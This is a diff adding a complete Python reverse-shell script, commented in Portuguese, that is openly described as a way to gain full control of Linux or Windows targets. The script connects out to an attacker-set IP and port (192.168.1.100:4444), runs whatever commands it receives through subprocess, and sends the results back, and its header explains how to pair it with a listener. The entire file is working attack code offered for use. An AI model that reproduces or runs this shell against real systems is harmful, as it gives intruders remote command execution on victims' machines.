@@ -1,0 +1,78 @@
+#!/usr/bin/env python3
+#
+# =================================================================
+# Shell Reverso em Python - Conexão Interativa
+# =================================================================
+#
+# Descrição: Script de shell reverso em Python que oferece uma interface
+# interativa completa para execução de comandos remotos.
+#
+# Quando usar: Para obter controle total sobre sistemas Linux/Windows
+# com Python instalado.
+#
+# Como usar: Execute o script e inicie um listener na porta especificada.
+#
+# Pré-requisitos: Python 3 instalado no sistema alvo.
+#
+# Observações: Mais estável que o método bash e oferece melhor
+# tratamento de erros. Funciona em ambos os sistemas operacionais.
+#
+# =================================================================
+
+# Importa módulos necessários
+import socket          # Para comunicação de rede
+import subprocess      # Para execução de comandos do sistema
+import os             # Para manipulação de sistema de arquivos
+
+# Configuração do endereço IP e porta do atacante
+LHOST = "192.168.1.100"  # MODIFIQUE: Endereço IP do seu servidor
+LPORT = 4444            # MODIFIQUE: Porta de escuta do seu servidor
+
+def reverse_shell():
+    """
+    Função principal que estabelece e mantém a conexão reversa
+    """
+    # Cria socket TCP
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
+    try:
+        # Conecta ao servidor do atacante
+        s.connect((LHOST, LPORT))
+
+        # Loop principal para execução de comandos
+        while True:
+            try:
+                # Envia prompt para o usuário
+                s.send(b"$ ")
+
+                # Recebe comando do atacante
+                cmd = s.recv(1024).decode().strip()
+
+                # Verifica se o comando é para sair
+                if cmd.lower() in ["exit", "quit"]:
+                    break
+
+                # Trata comando de mudança de diretório
+                if cmd.startswith("cd "):
+                    os.chdir(cmd[3:])
+                    s.send(b"")
+                else:
+                    # Executa comando e envia resultado de volta
+                    output = subprocess.getoutput(cmd)
+                    s.send(output.encode() + b"\n")
+
+            except KeyboardInterrupt:
+                # Trata interrupção do usuário
+                break
+            except Exception as e:
+                # Trata outros erros
+                s.send(f"Erro: {str(e)}\n".encode())
+                break
+
+    finally:
+        # Fecha a conexão ao final
+        s.close()
+
+# Executa a função principal quando o script é chamado diretamente
+if __name__ == "__main__":
+    reverse_shell()
